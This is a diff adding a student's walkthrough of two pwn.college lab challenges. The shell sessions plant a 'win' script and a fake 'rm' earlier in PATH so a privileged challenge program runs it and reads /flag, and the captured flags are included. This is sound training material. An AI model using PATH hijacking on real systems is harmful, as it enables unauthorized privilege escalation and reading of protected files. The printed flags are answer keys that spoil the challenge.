@@ -26,3 +26,49 @@ Congratulations! You properly set the flag and 'win' has launched!
 pwn.college{AtWGduYHHlvoSiBtrlsITiVukJu.dVzNyUDLygDO0czW}
 ```
 ## Adding commands 
+Multiple tries later
+```
+hacker@path~adding-commands:~$ touch win
+hacker@path~adding-commands:~$ nano win
+```
+```
+chmod a+x win; cat /flag
+```
+
+```
+hacker@path~adding-commands:~$ echo $PATH
+/run/challenge/bin:/run/workspace/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+hacker@path~adding-commands:~$ PATH=$PATH:/home/hacker
+hacker@path~adding-commands:~$ /challenge/run 
+Invoking 'win'....
+pwn.college{kfCNJupDwE-mJYLU-2lLHRhKetk.dZzNyUDLygDO0czW}
+```
+## Hijacking commands 
+```
+hacker@path~hijacking-commands:~$ touch rm
+hacker@path~hijacking-commands:~$ nano rm
+hacker@path~hijacking-commands:~$ echo $PATH
+/run/challenge/bin:/run/workspace/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+hacker@path~hijacking-commands:~$ PATH=/home/hacker:/run/challenge/bin:/run/workspace/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+hacker@path~hijacking-commands:~$ /challenge/run
+Trying to remove /flag...
+Found 'rm' command at /home/hacker/rm. Executing!
+hacker@path~hijacking-commands:~$ nano rm
+hacker@path~hijacking-commands:~$ /challenge/run
+Trying to remove /flag...
+Found 'rm' command at /home/hacker/rm. Executing!
+rm FOUND!!!!
+```
+no flag given unfortunately 
+added a cat /flag to rm
+```
+hacker@path~hijacking-commands:~$ /challenge/run
+Trying to remove /flag...
+Found 'rm' command at /home/hacker/rm. Executing!
+rm FOUND!!!!
+pwn.college{khm4RpVCGM1pCeVU8LCMYXUuAFG.ddzNyUDLygDO0czW}
+```
+flag given fortunately
+
+
+
